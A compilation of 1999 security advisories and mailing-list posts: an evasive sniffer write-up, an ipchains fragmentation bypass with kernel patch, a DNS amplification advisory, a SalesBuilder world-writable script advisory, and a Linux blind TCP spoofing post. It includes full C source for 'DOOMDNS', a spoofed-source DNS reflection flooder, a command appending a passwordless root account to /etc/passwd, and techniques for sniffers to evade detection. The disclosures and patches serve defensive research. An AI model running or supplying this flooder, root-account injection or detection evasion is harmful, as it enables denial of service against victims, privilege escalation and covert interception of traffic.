+For more information please contact AntiSniff@l0pht.com. The free beta
+download and full documentation are available at
+http://www.l0pht.com/antisniff/.
+
+About L0pht Heavy Industries
+
+L0pht Heavy Industries is a world renowned computer security think tank.
+Founded in 1992 as a computer research facility, the L0pht has grown into a
+leader in the field of computer security software. The L0pht's products
+include L0phtCrack, the industry standard NT password auditing tool. As a
+result of their innovative security research, the L0pht has released dozens
+of computer security advisories to the Internet community, warning of
+dangerous vulnerabilities in today's most widely used software. Many at the
+L0pht are considered top experts in the computer security field and have
+appeared on numerous network news programs and documentaries, as well as
+having testified about government computer security for the U.S. Senate.
+Visit the L0pht's web site at http://www.l0pht.com.
+
+All trademarks and registered trademarks are the property of their
+respective holders.
+
+
+
+These pages are Copyright 1999 L0pht Heavy Industries, Inc.
+
+
+
+
+
+
+
+
+
+
+
+
+
+---All Hail The AntiAntiSniffer Sniffer! :
+
+Hello once again folks.
+
+For those of you who didn't muck through the l0pht technical documentation,
+their AntiSniff product works in 3 ways:
+
+1. OS dependant IP stack glitches which mostly revolve around ether frames
+that have a different hwaddr than your NIC not being dropped by a kernel when
+the interface is in promiscous mode, thus eliciting some sort of response from
+your kernel.
+
+2. DNS lookups. When most sniffers are running, the resolve the IPs of the
+hosts they sniff, so all you have to to is send out some fake packets with
+fake IP headers, and listen for the sniffing host to try to resolve them via
+DNS.
+
+3. Latency. When the interface is in promiscous mode, the device no longer
+drops eth frames not destined for it's hwaddr, so this dropping must be done
+in kernelspace or in userland (by the sniffer). The logging proccess and the
+context switch from kernel to userspace eat up a good amount of time, so all
+you have to do is send a lot of data to the network with bogus IP's, then ping
+all the machines. The sniffing machines will have to wade through all the
+bogus data, and thus their responses are much slower.
+
+I was most impressed with #3. It does work surprisingly well for detecting
+promiscous legitamate loggers. In fact, 3 days before this advisory, I was
+very surprised to see that when I ran icmplogger (from the jail package) my
+ping responses from myself dropped from 0.0 to 1.4ms, and to other machines
+from 0.3 to 1.5ms. That's well over the 4 fold increase reported in the l0pht
+paper.
+
+Ok, now how did I get around all these issues? Well, lets go one by one:
+1. The Linux kernel is perfect (well, almost :). I checked the 2.2.10 source,
+and it in fact does always drop invalid eth frames destined for your machine
+when your are in promisc mode (see net/ipv4/ip_input.c).
+
+2. All you have to do is use inet_ntoa() instead of gethostbyname() :)
+
+3. This is where the REAL fun is. I designed a network load average evaluator
+that calculates a ms/packet rate. If the network falls below a user specified
+rate (ie LOTS of packets per ms), the sniffer does one of 3 things:
+        0. Will not trace more than a user specified number of conenctions
+           (fall-back mode)
+        a. Stopps queueing and logging connections to disk until the load
+           average goes back up (LAZY mode)
+        b. Drops the interface and goes to sleep if the load average for tcp
+           connections only goes below a specified rate (PARANOID mode)
+        c. Drops the interface and goes to sleep if the load average for ALL
+           network packets goes below a specified rate (REALLY_PARANOID mode)
+
+Issues that I came across:
+1. I randomized the sleep time so that we wouldn't be caught by a double scan
+that knows how long the default sleep time is for the sniffer.
+
+2. The sniffer averages the load over a user specified number of packets. It
+may be possible to write a compact version of AntiSniff that gets the job
+done in a number of number of packets small enough to evade the default
+setting, but that can always be lowered :)
+
+3. Some kernels don't like to work with the sniffer. In fact, I have a 486,
+a K6, and a dual PII 300 that I tested this thing on. It sniffs on the 486,
+but the kernel drops ALOT of packets, so the sniffer never sees the rate fall
+below the danger threshold. (I think this is because I set the CPU_IS_TO_SLOW
+option for the 486). The K6 works beautifully with the traffic detection, but
+will not sniff. Go figgure :) The only thing I can think of is that the K6 is
+configured no to use modules, perhaps this has some side effect in the socket
+PACKET code? The Dual PII 300 worked flawlessly.
+
+For more information, see the accomanied source file. I tired to make it as
+well commented as possible. It is based on the original LinSniffer by Mike
+Edulla. Linsniff666 (the modified version that uses linked lists) proved too
+unstable and looked too grossly ineffienct to use for something like this. My
+version does queue up connection in linked lists like linsniff666.
+
+I tried to make the sniffer as foolproof as possible to give the l0pht guys
+something to think about for revision 2.0. Remember, I did this all in only
+one night. I have no idea what a modivated hacker could do.
+
+Also, this is very beta. I know it will sniff. I haven't tested the linked
+list code very thouroghly, altho my brother and I did look over it for almost
+2 hours, and it does seem to work pretty well. I have no idea about memory
+leaks, or extremely heavy loads.
+
+P.S. To all my friends, coworkers, and associates who thought I knew better
+than to do something like this, please understand that when I discovered I
+could call the program The AntiAntiSniffer Sniffer, I just couldn't resist :)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---Linux 2.2.10 ipchains Advisory :
+
+
+
+Linux ipchains Firewall Vulnerability
+data protect GmbH - Advisory #2
+July 27, 1999
+
+Authors: Thomas Lopatic <tl@dataprotect.com>
+         John McDonald  <jm@dataprotect.com>
+
+Overview
+--------
+
+data protect has discovered a potential vulnerability in the Linux ipchains
+firewall implementation. In certain situations, it is possible for an
+attacker to bypass the packet filter when communicating with machines that
+allow incoming packets to specific ports. This attack is a variation
+of previously discussed fragmentation attacks, where the attacker uses
+fragments to rewrite parts of the TCP or UDP protocol header. In this case
+port information is rewritten in order to gain access to ports that should
+be blocked by the firewall.
+
+Included in this advisory is a patch to the 2.2.10 Linux kernel that corrects
+this vulnerability, and a pointer to example code that demonstrates the
+problem.
+
+Problem Description
+-------------------
+
+The Linux ipchains firewall code has special provisions for IP fragments that
+do not contain enough information for transport protocol header analysis.
+Fragments that start at offset 0, and are not long enough to provide complete
+transport header information are treated like fragments with an offset > 0
+(> 1 in the TCP case). This is the relevant code from ip_fw.c:
+
+        if (offset == 0) {
+                unsigned int size_req;
+                switch (ip->protocol) {
+                case IPPROTO_TCP:
+                        /* Don't care about things past flags word */
+                        size_req = 16;
+                        break;
+
+                case IPPROTO_UDP:
+                case IPPROTO_ICMP:
+                        size_req = 8;
+                        break;
+
+                default:
+                        size_req = 0;
+                }
+                offset = (ntohs(ip->tot_len) < (ip->ihl<<2)+size_req);
+        }
+
+As mentioned above, fragments with an offset of 0, that are too short to
+provide a full transport protocol header, are treated like non-first fragments.
+This allows an attacker to perform the following port rewriting attack:
+
+1. Attacker sends a fragment, with offset 0, a set IP_MF bit, and a full
+   transport protocol header which meets the packet filter and is passed to
+   the victim machine.
+
+2. Attacker sends a fragment, with offset 0, a set IP_MF bit, and a length of
+   4 bytes. This contains the (blocked) ports that the attacker wishes to
+   access on the victim machine. This fragment will be accepted by the
+   firewall and overlap - in the victim machine's reassembly chain - the port
+   information contained in the fragment sent in step 1.
+
+3. Attacker sends a fragment with a cleared IP_MF bit, starting where the first
+   fragment left off, that completes the set of fragments.
+
+Depending on the defragmentation strategy of the victim machine's operating
+system, it might be necessary to swap steps 1 and 2.
+
+It is important to note that there are two conditions that must be met for a
+particular ipchains packet filter to be vulnerable:
+
+1. The packet filter must not be configured with the Linux kernel option
+   CONFIG_IP_ALWAYS_DEFRAG. If the packet filter reassembles the fragments
+   before doing the firewall checks, then this attack will fail.
+
+2. The packet filter must have a rule to allow non-first fragments to pass.
+   The Linux ipchains how-to suggests that either an administrator selects
+   CONFIG_IP_ALWAYS_DEFRAG, or implements such a rule. This rule was considered
+   to be safe because fragments with an offset of 1 are blocked by the packet
+   filter, which prevents attacks based on rewriting the TCP flags.
+
+Fix Information
+---------------
+
+The following Linux kernel patch (against version 2.2.10) will close this
+vulnerability by blocking packets that could be used to rewrite header
+information in this fashion.
+
+It is also possible to reconfigure the ipchains machine to always defragment
+packets, or to remove any rule which passes non-first IP fragments through the
+firewall ("-f" option of the "ipchains" command). The latter, however, might
+introduce incompatibilities, e.g. with applications that transmit large UDP
+datagrams across the firewall and hence cause IP fragmentation.
+
+*** linux.old/net/ipv4/ip_fw.c  Wed Jun  9 05:33:07 1999
+--- linux/net/ipv4/ip_fw.c      Fri Jul 23 19:20:45 1999
+***************
+*** 37,42 ****
+--- 37,45 ----
+   * 19-May-1999: Star Wars: The Phantom Menace opened.  Rule num
+   *            printed in log (modified from Michael Hasenstein's patch).
+   *            Added SYN in log message. --RR
++  * 23-Jul-1999: Fixed small fragment security exposure opened on 15-May-1998.
++  *              John McDonald <jm@dataprotect.com>
++  *              Thomas Lopatic <tl@dataprotect.com>
+   */
+
+  /*
+***************
+*** 644,650 ****
+                default:
+                        size_req = 0;
+                }
+!               offset = (ntohs(ip->tot_len) < (ip->ihl<<2)+size_req);
+        }
+
+        src = ip->saddr;
+--- 647,666 ----
+                default:
+                        size_req = 0;
+                }
+!
+!               /* If it is a truncated first fragment then it can be
+!                * used to rewrite port information, and thus should
+!                * be blocked.
+!                */
+!
+!               if (ntohs(ip->tot_len) < (ip->ihl<<2)+size_req)
+!               {
+!                       if (!testing && net_ratelimit()) {
+!                               printk("Suspect short first fragment.\n");
+!                               dump_packet(ip,rif,NULL,NULL,0,0,0,0);
+!                       }
+!                       return FW_BLOCK;
+!               }
+        }
+
+        src = ip->saddr;
+
+Demonstration Code
+------------------
+
+fragrouter, a component of Nidsbench, has been updated to perform this attack
+transparently. This is an excellent open source tool for testing intrusion
+detection systems and packet filters provided by Anzen Computing. The version
+of fragrouter that performs this attack should be available shortly, at
+http://www.anzen.com/research/nidsbench/.
+
+Additional Information
+----------------------
+
+data protect would like to thank Dug Song <dugsong@anzen.com> for his help in
+implementing this attack.
+
+For information regarding this advisory, please contact
+Thomas Lopatic <tl@dataprotect.com> or John McDonald <jm@dataprotect.com>.
+
+The contents of this advisory are Copyright (C) 1999 data protect GmbH,
+and may be distributed freely provided that no fee is charged for
+distribution, and that proper credit is given.
+
+
+---Possible Denial Of Service using DNS :
+
+
+
+SPJ-002-000:
+
+                   .::::::::+[ s0ftpr0ject 99 ]+::::::::.
+                   ::::+[ Digital Security for Y2K ]+::::
+                   :::'"""`"'"""`"'"""`"'"""`"'"`"'""`:::
+                   ::'.g#S$"$S#n. .g#S$"$S#n.     S#n.`::
+                   :: $$$$$ $$$$$ $$$$$ $$$$$     $$$$ ::
+                   :: $$$$$       $$$$$ $$$$$     $$$$ ::
+                   :: `$$$$$$$$$n $$$$$ $$$$$     $$$$ ::
+                   ::       $$$$$ $$$$$s$$$$'     $$$$ ::
+                   :: $$$$$ $$$$$ $$$$$     $$$$$ $$$$ ::
+                   :: `$$$$s$$$S' `$$$$     `$$$$s$$S' ::
+                   :::...........:.....:::::..........:::
+                   :::+[ Security Advisory, 002-000 ]+:::
+                   `::::::::+[ July 19, 1999 ]+:::::::::'
+
+
+                    Possible Denial Of Service using DNS
+
+                      by |scacco| <scacco@s0ftpj.org>
+
+
+---[ Systems affected ]-------------------------------------------------------
+
+All systems running Bind (All versions seems affected).
+
+
+
+---[ Condition of discovery ]-------------------------------------------------
+
+This misfeature was discovered configuring bind on a Red Hat 5.2 system
+shipped with the original cdrom, allowing udp dns requests and without
+access lists.
+
+
+---[ Detailed description ]---------------------------------------------------
+
+All domain name systems resides on port 53 formely called domain. Looking at
+rfc and in particular at RedHat system defaults seems that port 53 is enabled
+to support udp and tcp requests as specified in /etc/services file:
+
+domain          53/tcp
+domain          53/udp
+
+It's possible to flood someone sending spoofed UDP QUERY to the DNS,
+because UDP doesn't provide a fruitful authentication process.
+Why use DNS QUERY? Simple. We just want to make sure we've got a real advantage
+against our nice target so we look for a good I/O ratio. With just a few bytes
+(20-30) we can achieve responses of around 400-500 bytes. So we usually
+achieve a 20x ratio. Furthemore, every DNS reply will eligit ICMP unreach
+packets from the target since no UDP port will be open to accept data.
+A modem user compared with large RR of type * (0xFF) will be flooded.                                     *
+
+
+---[ Exploitation ]-----------------------------------------------------------
+
+/******************************************************************
+*                                                                 *
+* DOOMDNS       Yet another flooder with 1:x pkts ratio. This one *
+*               exploits DNS simple QUERY with spoofed UDPs.      *
+*               Since almost every DNS is bound to answer queries *
+*               from the void, and since UDP doesn't provide a    *
+*               fruitful authentication process cause plain TCP   *
+*               does, uh !? ;) here we are.                       *
+*                                                                 *
+*                              hints by |scacco|, code by FuSyS   *
+*                              http://www.s0ftpj.org              *
+*                                                                 *
+******************************************************************/
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <arpa/nameser.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netdb.h>
+#include <time.h>
+
+#define IP_HEAD_BASE            20
+#define UDP_HEAD_BASE           8
+
+unsigned long saddr;
+int sfd, loop;
+char *dns_def[]={/* LISTA ASSENTE */ ,NULL};
+char *domains[]={/* LISTA ASSENTE */ ,NULL};
+
+struct DNS_MSG {
+        HEADER head;
+        char query[255];
+};
+
+struct dns_pkt {
+        struct iphdr ip;
+        struct udphdr udp;
+        char data[1000];
+};
+
+unsigned long nameResolve(char *hostname)
+{
+  struct in_addr addr;
+  struct hostent *hostEnt;
+
+  if((addr.s_addr=inet_addr(hostname)) == -1)
+  {
+    if(!(hostEnt=gethostbyname(hostname)))
+    {
+        fprintf(stderr,"N0 SUCH H0ST:`%s`\n",hostname);
+        exit(0);
+    }
+    bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
+  }
+  return addr.s_addr;
+}
+
+void forge (unsigned long daddr, unsigned short src, unsigned short dst)
+{
+        struct sockaddr_in sin;
+        struct dns_pkt dpk;
+        struct DNS_MSG killer;
+        int shoot, len;
+
+        memset(&killer, 0, sizeof(killer));
+        killer.head.id=getpid();
+        killer.head.rd=1;
+        killer.head.aa=0;
+        killer.head.opcode=QUERY;
+        killer.head.qr=0;
+        killer.head.qdcount=htons(1);
+        killer.head.ancount=htons(0);
+        killer.head.nscount=htons(0);
+        killer.head.arcount=htons(0);
+        strcat(killer.query, domains[--loop]);
+        killer.query[strlen(domains[loop])+2]=0x00FF;
+        killer.query[strlen(domains[loop])+4]=0x0001;
+
+        memset(&dpk, 0, sizeof(dpk));
+
+        dpk.udp.source=src;
+        dpk.udp.dest=dst;
+        len=(12+strlen(killer.query)+5);
+        dpk.udp.len=htons(UDP_HEAD_BASE+len);
+        memcpy(dpk.data, (void*)&killer, len);
+
+        dpk.ip.ihl=5;
+        dpk.ip.version=4;
+        dpk.ip.tos=0;
+        dpk.ip.tot_len=htons(IP_HEAD_BASE+UDP_HEAD_BASE+len);
+        dpk.ip.frag_off=0;
+        dpk.ip.ttl=64;
+        dpk.ip.protocol=IPPROTO_UDP;
+        dpk.ip.saddr=saddr;
+        dpk.ip.daddr=daddr;
+
+        memset(&sin, 0, sizeof(sin));
+        sin.sin_family=AF_INET;
+        sin.sin_port=dst;
+        sin.sin_addr.s_addr=daddr;
+
+        shoot=sendto(sfd, &dpk,IP_HEAD_BASE+UDP_HEAD_BASE+len,
+                0, (struct sockaddr *)&sin, sizeof(sin));
+        if(shoot<0)fprintf(stderr, "SPOOF ERROR");
+        loop++;
+}
+
+void doomzone (void)
+{
+        unsigned long daddr;
+        unsigned short source, dest;
+
+        if(dns_def[loop]==NULL) loop=0;
+        daddr=nameResolve(dns_def[loop++]);
+        source=htons(1024+(rand()%2000));
+        dest=htons(53);
+        forge(daddr, source, dest);
+}
+
+int main (int argc, char **argv)
+{
+        int sfdo;
+        unsigned int hz=100;
+
+        if(argc<2) {
+                fprintf(stderr, "Interesting .... let's flood ourselves ?!\n");
+                fprintf(stderr, "Use: %s target [n]\n", argv[0]);
+                exit(0);
+        }
+
+        if(argv[2]) hz=atoi(argv[2]);
+        saddr=nameResolve(argv[1]);
+
+        srand(time(NULL));
+
+        if((sfd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0) {
+                fprintf(stderr, "\nSOCK_RAW Died\n");
+                exit(2);
+        }
+        sfdo=1;
+        if(setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &sfdo, sizeof(sfdo))<0) {
+                fprintf(stderr, "\nIP_HDRINCL Died\n");
+                exit(3);
+        }
+
+        printf("\n\033[1;32mD00M DNS\033[0m");
+        printf("\n\033[1;34mDNS Flooder by FuSyS\033[0m");
+        printf("\n\033[1;34minithints by |scacco|\033[0m\n\n");
+
+        loop=0;
+        while(hz--) {
+                doomzone();
+                printf("\033[1;34m.\033[0m");
+        }
+        printf("\n\n");
+        return(0);
+}
+
+
+---[Possible fixes ]----------------------------------------------------------
+
+Seems hard to fix this hole due to dns protocol specification, it could be
+possible to setup access lists or some sort of packet sanity check, for this
+we want suggest you to keep in contact with ISC staff to get a more efficent
+solution for this problem.
+
+
+---[ URLs and references ]----------------------------------------------------
+
+Internet Software Consurtium can be found at http://www.isc.org.
+This is also the home of bind.
+
+---[ Contact informations ]---------------------------------------------------
+
+s0ftpr0ject 99 - Digital security for Y2K (s0ftpj)
+no-profit security research
+
+Internet site: http://www.s0ftpj.org
+E-mail       : staff@s0ftpj.org
+
+
+All advisories and security documents are available via http at:
+
+http://www.s0ftpj.org (195.32.69.44) courtesy of Metro Olografix
+http://www.olografix.org (195.32.69.44)
+
+This document has no copyright, feel free to distribute it without any
+limitation. Original copy of this document can be found at out Internet site
+for free. You are not allowed to modify this paper without prior notify to
+s0ftpr0ject staff at staff@s0ftpj.org.
+
+
+
+---[ s0ftpr0ject 99 staff Public PGP Key ]------------------------------------
+
+Type Bits/KeyID    Date       User ID
+pub  2600/15A01BB9 1999/07/22 S0ftPj Staff <staff@s0ftpj.org>
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+
+mQFSAzeXNL8AAAEKKNzvok6FkB24mQUEx5Q4SZ97dQlmx3yNeEvG7aJ/0TDKWWUv
+f6a+t1jF8V7JMhV1JxU/z38MgTYRGt6dspWlTLKb543GxBRqOdMohigBu8rUmDEb
+UlD9gAav5M+OSY6oNh5a7e/YrPLhOiqxNxBIXQCDgKtIUv9NF8KbcbS96EAmNsuH
+UA/hJ2Arlx2wSkmJZgvcpiM6O/1g1OYgg7Gur39SqsNZn0RUKxi463qASGfJT4sa
+rpH6clBsVpNei5bf/4Bke5/8dnJL5DzM0twxTUmvdq1Pt1+6sRCd70IsqXPvjZu2
+Drx4rzlLItD84xmE9w/vGdLMtPSTPwX7ak2TvhWqBOkqzWJNiRjzi+T6HiNfuqUr
+sr90FndiRNJcWCbmPs2TJISLePsi9AVGL5KFfmimdSJPagzWG1FVQhyo2HS4nRWg
+G7kABRG0H1MwZnRQaiBTdGFmZiA8c3RhZmZAczBmdHBqLm9yZz6JAVoDBRA3lzS/
+2HS4nRWgG7kBAaYiCiQPM05Pr5FkSgjHkVUbgyxwuWkp9MDOxhvFAgcsHJUX2h6V
+F02vzDMR2BOvaRhkm43IwXxK490Tp86pbbhC28SiF3TEyHjmu8tMrXo/cX69fcqy
+IbvVgHKEIUYR8Sik7mLX9HqUh9qh7e6o4cH5TsCCJxIoqf2Qt4t5HA4m77H1niNP
+EqY2HGzvQUPfvTf+KffdLGoAa/NSKJyB8stlWIJ4SAe7EkGscSjcDFvrm25pDT33
+JHyBHBdmUY0Kr+gzmg9CuUZUhVtdun0mwZJLicOSUFQeYuPsid+ayggdgfGR7spM
+NymPkS2MF8jGOKCa9EqWbn5gBP0uZm5aMrg6+O+s+xNonK0BcFH7iIUAsL9qUHLD
+4edFudwxa6XW7LuJoqDVlUzhqA3Ru5Yd8eTD7vbcjR3fRngDpLDu8UhC0MFQSoDW
+IWKJ
+=i4i0
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+
+
+---World writable root owned script in SalesBuilder (RedHat 6.0) :
+
+
+
+SPJ-001-000:
+
+                   .::::::::+[ s0ftpr0ject 99 ]+::::::::.
+                   ::::+[ Digital Security for Y2K ]+::::
+                   :::'"""`"'"""`"'"""`"'"""`"'"`"'""`:::
+                   ::'.g#S$"$S#n. .g#S$"$S#n.     S#n.`::
+                   :: $$$$$ $$$$$ $$$$$ $$$$$     $$$$ ::
+                   :: $$$$$       $$$$$ $$$$$     $$$$ ::
+                   :: `$$$$$$$$$n $$$$$ $$$$$     $$$$ ::
+                   ::       $$$$$ $$$$$s$$$$'     $$$$ ::
+                   :: $$$$$ $$$$$ $$$$$     $$$$$ $$$$ ::
+                   :: `$$$$s$$$S' `$$$$     `$$$$s$$S' ::
+                   :::...........:.....:::::..........:::
+                   :::+[ Security Advisory, 001-000 ]+:::
+                   `::::::::+[ July 12, 1999 ]+:::::::::'
+
+
+                    World Writable File in SalesBuilder
+
+                      by |scacco| <scacco@s0ftpj.org>
+
+
+---[ Systems affected ]-------------------------------------------------------
+
+All systems running Acushop SalesBuilder.
+
+
+
+---[ Condition of discovery ]-------------------------------------------------
+
+This bug was discovered installing software from the application cd shipped
+with RedHat Linux 6.0 as root.
+
+
+
+---[ Detailed description ]---------------------------------------------------
+
+The startup file .sbstart linked from /usr/bin/salesbuilder and
+/usr/local/bin/salesbuilder is set world writable so anyone can add code
+to it and possibly get root locally. .sbstart can be found (after
+installing it from RedHat application cd) at /usr/local/bin/acushop/.sbstart.
+If this application was installed as root you will see this permission
+set:
+-rwxrwxrwx   1 root     root          163 Jun 29 19:45 .sbstart
+Seems it can be executed and write by everyone. Someone can simply add a line
+line echo "r00t::0:0::/root:/bin/sh" >> /etc/passwd or make a script executed
+with root uid and gid.
+Note that this file is set hidden using . as prefix so modifications are
+really hard to discover from a not-so expert system administrator.
+
+
+
+---[ Exploitation ]-----------------------------------------------------------
+
+Just edit the file with a normal text editor like vi, joe, pico or emacs and
+add a line like:
+echo "r00t::0:0::/root:/bin/sh" >> /etc/passwd
+Of course there are many ways to get this hole usable, you can figure out how.
+
+
+
+---[Possible fixes ]----------------------------------------------------------
+
+Possible fix is to install this software not as root, and if it necessary
+do not set it world writable. Acushop was advised of this vulnerability but
+seemed not really interested in security.
+
+
+
+---[ URLs and references ]----------------------------------------------------
+
+Acushop Sales Builder can be found at http://www.acushop.com.
+
+
+
+---[ Contact informations ]---------------------------------------------------
+
+s0ftpr0ject 99 - Digital security for Y2K (s0ftpj)
+no-profit security research
+
+Internet site: http://www.s0ftpj.org
+E-mail       : advisory@s0ftpj.org
+             : staff@s0ftpj.org
+
+All advisories and security documents are available via http at:
+
+http://www.s0ftpj.org (195.32.69.44) courtesy of Metro Olografix
+http://www.olografix.org (195.32.69.44)
+
+This document has no copyright, feel free to distribute it without any
+limitation. Original copy of this document can be found at out Internet site
+for free. You are not allowed to modify this paper without prior notify to
+s0ftpr0ject staff at staff@s0ftpj.org.
+
+
+
+---[ s0ftpr0ject 99 staff Public PGP Key ]------------------------------------
+
+Type Bits/KeyID    Date       User ID
+pub  2600/15A01BB9 1999/07/22 S0ftPj Staff <staff@s0ftpj.org>
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+
+mQFSAzeXNL8AAAEKKNzvok6FkB24mQUEx5Q4SZ97dQlmx3yNeEvG7aJ/0TDKWWUv
+f6a+t1jF8V7JMhV1JxU/z38MgTYRGt6dspWlTLKb543GxBRqOdMohigBu8rUmDEb
+UlD9gAav5M+OSY6oNh5a7e/YrPLhOiqxNxBIXQCDgKtIUv9NF8KbcbS96EAmNsuH
+UA/hJ2Arlx2wSkmJZgvcpiM6O/1g1OYgg7Gur39SqsNZn0RUKxi463qASGfJT4sa
+rpH6clBsVpNei5bf/4Bke5/8dnJL5DzM0twxTUmvdq1Pt1+6sRCd70IsqXPvjZu2
+Drx4rzlLItD84xmE9w/vGdLMtPSTPwX7ak2TvhWqBOkqzWJNiRjzi+T6HiNfuqUr
+sr90FndiRNJcWCbmPs2TJISLePsi9AVGL5KFfmimdSJPagzWG1FVQhyo2HS4nRWg
+G7kABRG0H1MwZnRQaiBTdGFmZiA8c3RhZmZAczBmdHBqLm9yZz6JAVoDBRA3lzS/
+2HS4nRWgG7kBAaYiCiQPM05Pr5FkSgjHkVUbgyxwuWkp9MDOxhvFAgcsHJUX2h6V
+F02vzDMR2BOvaRhkm43IwXxK490Tp86pbbhC28SiF3TEyHjmu8tMrXo/cX69fcqy
+IbvVgHKEIUYR8Sik7mLX9HqUh9qh7e6o4cH5TsCCJxIoqf2Qt4t5HA4m77H1niNP
+EqY2HGzvQUPfvTf+KffdLGoAa/NSKJyB8stlWIJ4SAe7EkGscSjcDFvrm25pDT33
+JHyBHBdmUY0Kr+gzmg9CuUZUhVtdun0mwZJLicOSUFQeYuPsid+ayggdgfGR7spM
+NymPkS2MF8jGOKCa9EqWbn5gBP0uZm5aMrg6+O+s+xNonK0BcFH7iIUAsL9qUHLD
+4edFudwxa6XW7LuJoqDVlUzhqA3Ru5Yd8eTD7vbcjR3fRngDpLDu8UhC0MFQSoDW
+IWKJ
+=i4i0
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+
+
+
+---Linux blind TCP spoofing, act II + others :
+
+Hello,
+Thanks to libnids development, some features/bugs in Linux kernel were found.
+I notified kernel mantainers in May, but they didn't seem interested.
+
+1. Blind TCP spoofing against 2.0.36/37
+        Let's label a Linux server as A, an attacker's host as B, the spoofed
+host as C. If the following conditions hold:
+
+a) C is down (disabled)
+b) A is idle; more precisely, during the attack A should not send any
+   packets beside ones generated in response to the packets sent by B
+c) during the attack, no packet sent from B to A can be dropped by a router
+
+then an attacker can spoof a TCP stream connecting A and C.
+        As we see, these conditions are not trivial. However, b) and c) can
+hold if an attack is conducted during low network traffic period; and there
+are ways to fulfill a) :)
+        Firstly, let's have a look how Linux 2.0.x reacts to a non-typical
+TCP segment sent as a third packet of a three way handshake. In the example
+below we send to a Linux server (A) packets from B with source address set to
+C.
+Time        packets with forged source address    packets sent by the server
+0             flags=S,seq=X
+1                                              flags=SA,seq=Y,ack_seq=X+1
+2             flags=A,seq=X+1, ack_seq=Y-1000
+3                                                no packet generated !
+4             flags=A,seq=X+1,ack_seq=Y+1000
+5                                               flags=R,seq=Y+1000
+                                                a packet IS generated !
+6             flags=A,seq=X+1,ack_seq=Y+1
+7                                               flags=A,seq=Y+1,ack_seq=X+1
+                                         socket enters "established" state
+8             flags=A,seq=X+1,ack_seq=Y+1000
+9                                                no packet sent !
+
+        So, when an attacker sends (as a third packet of tcp handshake) a
+packet with too small ack_seq, the server sends no packets (doesn't it
+violate RFC793 ?). When a packet with too big ack_seq is sent, the server
+sends a packet (with a reset flag).
+        Now let's recall another Linux feature. Many OSes (including Linux)
+assign to ID field of an outgoing IP datagram consecutive, increasing
+numbers (we forget about fragmentation here; irrelevant in this case). That
+enables anyone to determine the number of packets sent by host A: it's enough
+to ping it, note the value of ID field of received ICMP_REPLY packet, wait x
+seconds (or perform some other actions), then again ping host A. The
+difference between ID fields of received ICMP_REPLY packets is equal to (the
+number of packets sent by A in x second) +1. "Idle portscan" by antirez uses
+this technique.
+        Having sent an initial TCP segment with SYN flag, our attack will
+consist of a set of "probes". In each probe, we send a (forged) TCP packet
+with flags=A and (arbitrary) ack_seq=X, then we send an ICMP_ECHO request, and
+finally note the ID field of received ICMP_REPLY packet. If this ID field has
+incremented by 1 since the last time, only one packet were sent by server
+(ICMP_REPLY), so we must have chosen too small X (that is, ack_seq). If ID
+field has incremented by 2, two packes were sent (TCP with reset flag and
+ICMP_REPLY), so we must have chosen too big ack_seq. This way we can perform
+a binary search in space of ack_seq's, determining exact ack_seq after at most
+32 probes. Note that finding correct ack_seq can be verified by sending a
+probe with previously found too big ack_seq; if connection is in "established"
+state, no packet will be generated by server.
+        After we have found the Holy Graal of blind spoofers, the correct
+value of ack_seq, nothing will prevent us from completing 3whs and sending
+arbitrary data.
+        At the end of this post I enclosed an exploit; don't use it without
+the permission of the target host's admin. I tested it on 2.0.37, 36 and 30;
+probably all 2.0.x are affected. It requires libnet (which can be downloaded
+from www.packetfactory.net). I compiled it on Linux glibc system. The
+following simple patch (against 2.0.37) enforces sending a reset in response
+to a packet with too small ack_seq (of course, only when we are in SYN_RECV
+state). This patch also cures the bug described in point 3.
+
+-------------------------CUT HERE--------------------------------------
+--- linux-2.0.37/net/ipv4/tcp_input.c.orig      Fri Jul 23 17:25:14 1999
++++ linux/net/ipv4/tcp_input.c  Fri Jul 23 17:29:43 1999
+@@ -2764,7 +2764,18 @@
+                kfree_skb(skb, FREE_READ);
+                return 0;
+        }
+-
++
++        if (sk->state==TCP_SYN_RECV && th->ack && skb->ack_seq!=sk->sent_seq)
++        {
++                /*
++                 *      Quick fix to detect too small ack_seq
++                 *      in 3rd packet of 3ws and force a RST segment.
++                 */
++                 tcp_send_reset(daddr, saddr, th,sk->prot, opt, dev,0,255);
++                 kfree_skb(skb, FREE_READ);
++                 return 0;
++        }
++
+ rfc_step6:
+        /*
+         *      If the accepted buffer put us over our queue size we
+-------------------------CUT HERE--------------------------------------
+
+2. A byte of urgent data can be received in normal data stream. Let's
+consider the following scenario:
+Time              Client app             Server app
+0                                     bind(...), listen(...), accept(...)
+1                 connect(...)
+2                                     accept(...) returns newsock
+3      send(sockfd,"AB",2,MSG_OOB)
+4      send(sockfd,"XY",2,MSG_OOB)
+5                                     n=read(newsock,buffer,1024)
+
+function read returns 3, buffer contains "ABX", though byte 'B' was marked
+as urgent. Verified with 2.0.37 and 2.2.9-ac1, probably all versions are
+vulnerable. Note that this behaviour can be exploited to bypass NIDS.
+
+3. Weird handling of 3rd stage of TCP handshake.
+
+Time        packets sent by a client        packets sent by a server
+0          flags=S,seq=X
+1                                         flags=SA,seq=Y,ack_seq=X+1
+2 flags=A,seq=X+1,ack_seq=Y-4,data="xyz"
+3                                        flags=A,seq=Y+1,ack_seq=X+4
+                                           no data is returned to app
+4                                        flags=SA,seq=Y+1,ack_seq=X+4
+5 flags=A,seq=X+1,ack_seq=Y+1,data="1234567"
+6                                        flags=A,seq=Y+1,ack_seq=X+8
+                                          app receives "4567"
+which is inconsitent. Either the packet sent in time 2 should be discarded and
+app should receive "1234567", or app should receive "xyz4567" .
+Verified on 2.0.36, 2.2.x behaves correctly (sends reset in time 3).
+Usually it is not a problem, but IDS developers can be worried.
+
+Save yourself,
+Nergal
+
+/* by Nergal */
+
+#include "libnet.h"
+#include <netinet/ip.h>
+#include <netdb.h>
